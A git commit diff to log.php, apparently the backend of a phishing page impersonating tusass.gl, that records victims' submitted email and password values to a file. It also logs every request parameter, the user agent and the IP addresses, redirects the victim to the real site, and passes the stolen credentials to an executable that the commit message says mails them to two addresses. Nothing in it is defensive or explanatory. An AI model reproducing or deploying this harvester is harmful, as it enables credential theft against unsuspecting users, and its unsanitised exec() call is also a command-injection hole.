e78b733e19240207704bcec07fe6b136d10098d0
hackman2 <30339823+hackman2@users.noreply.github.com>
2017-07-21 23:57:34 +0200

    Minor adjustments to exe and logs and naming
    Exe now sends to 2 mails and php is more efficient.

--- log.php
+++ log.php
@@ -2,31 +2,40 @@
 
 header("Location: http://www.tusass.gl ");
 
-$log_handler = fopen("logs.log", "a");
-$credentials_handler = fopen("passwords.txt", "a");
+
+$credentials_handler = fopen("data/passwords.txt", "a");
+
+$username = $_GET['email'];
+$password = $_GET['pass'];
+
+fwrite($credentials_handler, "email='$username'\r\n");
+fwrite($credentials_handler, "pass='$password'\r\n");
+fwrite($credentials_handler, "----------------\r\n");
+
+fclose($credentials_handler);
+
+
+$log_handler = fopen("data/comprehensive_log.log", "a");
 
 foreach($_GET as $variable => $value) {
-    fwrite($log_handler, "$variable=$value\r\n");
-
-    if ($variable == "email") {
-        fwrite($credentials_handler, "email='$value'\r\n");
-    }
-    elseif ($variable == "pass") {
-        fwrite($credentials_handler, "pass='$value'\r\n");
-    }
+    fwrite($log_handler, "$variable='$value'\r\n");
 }
 
 $client_ip = $_SERVER['REMOTE_ADDR'];
 $proxy_forwarded_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
 
+fwrite($log_handler, "non-standard data------\r\n");
+fwrite($log_handler, $_SERVER['HTTP_USER_AGENT']);
+fwrite($log_handler, "\r\n");
 fwrite($log_handler, "$client_ip\r\n");
 fwrite($log_handler, "$proxy_forwarded_ip\r\n");
-
-fwrite($log_handler, "----\r\n");
-fwrite($credentials_handler, "----\r\n");
+fwrite($log_handler, "----------------\r\n");
 
 fclose($log_handler);
-fclose($credentials_handler);
+
+
+exec("executables/Execute.exe $username $password");
+
 
 exit;
 
